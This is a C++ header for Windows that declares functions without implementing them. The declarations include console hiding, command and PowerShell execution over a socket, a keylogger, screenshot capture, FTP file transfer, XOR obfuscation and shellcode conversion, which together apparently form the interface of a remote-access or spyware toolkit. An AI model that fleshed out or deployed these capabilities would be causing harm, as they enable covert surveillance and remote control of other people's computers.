#pragma once

#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <cstdint>
#include <stdbool.h>
#include <vector>
#include <sstream>

#include <sys/types.h>
#include <sys/types.h>
#include <sys/stat.h>

#include <errno.h>
#include <string.h>
#include <direct.h>
#include <stdexcept>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <WinInet.h> // -lwininet

#include <windows.h>
#include <lmcons.h>
#include <string>
#include <fstream>
#include <wtypes.h>
#include <Ole2.h>
#include <OleCtl.h>
#include <TlHelp32.h>

using namespace std;

#define GET_WINDOWS_DEFAULT_INFORMATIONS "WindowsDefaults"
#define GET_WINDOWS_BUILD_LAB_EX "WindowsBuildLabEx"
#define GET_WINDOWS_CURRENT_VERSION "WindowsCurrentVersion"
#define GET_WINDOWS_EDITION_ID "WindowsEditionId"
#define GET_WINDOWS_INSTALLATION_TYPE "WindowsInstallationType"
#define GET_WINDOWS_INSTALL_DATE_FROM_REGISTRY "WindowsInstallDateFromRegistry"

#define BUFFER_SIZE_DEFAULT 4096

#pragma comment(lib, "Ws2_32.lib")
#pragma comment (lib, "wininet.lib")
#pragma comment(lib,"OleAut32.Lib")
#pragma comment(lib,"Winmm.lib")

void hello_world(void);
char * raw_input(char *input_string);
int input(char *input_string);
void clear(void);
int substring_in_string(char *substring,char *string);
void print(char *string);
TCHAR *get_username();
int check_dir(char *pathname);
int tchar_substring_in_string(char *substring,TCHAR *string);
int StartsWith(const char *a, const char *b);
void hide_console(void);
void sleep(int number);
int connect(SOCKET socks_instance,struct sockaddr_in session);
int send(SOCKET socks_instance,char *buffer);
int recv(SOCKET socks_instance,char *buffer,int len);
void cmd_command(SOCKET socks_instance,char *command);
void powershell_command(SOCKET socks_instance,char*command);
void wsl_command(SOCKET socks_instance,char *command);
void execute_process(SOCKET socks_instance,char *process);
void execute_cmd(SOCKET socks_instance);
void execute_powershell(SOCKET socks_instance);
int download_to_ftp(char* filename, char* ftp_host, int ftp_port, char* ftp_user, char* ftp_pass);
int cd(char* path);
int download_on_ftp(char* filename, char* ftp_host, int ftp_port, char* ftp_user, char* ftp_pass);
void WriteLog(string filename, const char* key);
void WriteLogChar(string filename, char key);
int keylistener(string FILENAME_LOG, int key);
int keylogger_spawn(string FILENAME_LOG);
vector<string> split(const string& s, char delim);
string path_link(string link);
bool endswith(const std::string& str, const std::string& suffix);
bool startswith(const std::string& str, const std::string& prefix);
vector<int> GetScreenResolution(int& horizontal, int& vertical);
bool saveBitmap(LPCSTR filename, HBITMAP bmp, HPALETTE pal);
bool screenshot(int x, int y, int w, int h, LPCSTR fname);
char* cmd_popen_char(const char* command, const char* mode, char* buffer);
char* pwd(char *buffer);
string tohex(string buffer);
string xor_string_enc_dec(string data, char key[]);
int xor_logic(int a, int b);
bool bool_xor_logic(bool a, bool b);
int getpid(const string& process_name);
string string_to_shellcode(string buffer);
string hex_to_shellcode(string buffer);
BOOL check_admin(void);
string read_file(string filename,string buffer_return);
string read_file_binary(string filename,string buffer_return);
string read_file_to_hex(string filename,string buffer_return);
string read_file_binary_to_hex(string filename,string buffer_return);
void open_process(LPCSTR process,LPCSTR args,LPCSTR dir);
char *get_system_info_by_powershell(char* buffer, char* mode);